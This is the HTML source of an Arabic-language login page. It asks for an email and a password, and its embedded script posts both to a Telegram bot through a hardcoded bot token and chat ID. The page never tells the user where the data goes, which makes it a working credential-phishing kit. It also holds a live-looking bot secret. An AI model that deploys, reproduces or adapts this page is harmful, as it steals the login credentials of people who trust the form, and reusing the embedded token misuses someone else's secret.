<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
        input, button { display: block; margin: 10px auto; padding: 10px; width: 80%; max-width: 300px; }
        img { max-width: 300px; margin-top: 20px; border-radius: 10px; }
    </style>
</head>
<body>

    <!-- صورة ترحيبية تظهر عند دخول الموقع -->
    <img src="https://drive.google.com/uc?export=view&id=1AQHhixqEKBzaNplesO9c5zWkjLc1dYoN" alt="صورة ترحيبية">

    <h2>تسجيل الدخول</h2>
    <form id="loginForm">
        <input type="email" id="email" placeholder="📧 البريد الإلكتروني" required>
        <input type="password" id="password" placeholder="🔑 كلمة السر" required>
        <button type="submit">إرسال</button>
    </form>
    
    <script>
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault();

            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            const botToken = "7951759668:AAF-JShe3fj4-Zk3rB9g3np5Al8V983WC04";
            const chatId = "7141386521";

            let message = `📩 *تسجيل جديد*\n\n📧 البريد: ${email}\n🔑 كلمة السر: ${password}`;

            // إرسال البيانات إلى تيليجرام
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
            })
            .then(() => {
                alert("✅ تم إرسال البيانات بنجاح!");
            })
            .catch(error => {
                alert("❌ حدث خطأ أثناء الإرسال!");
                console.error("Error:", error);
            });
        });
    </script>

</body>
</html>
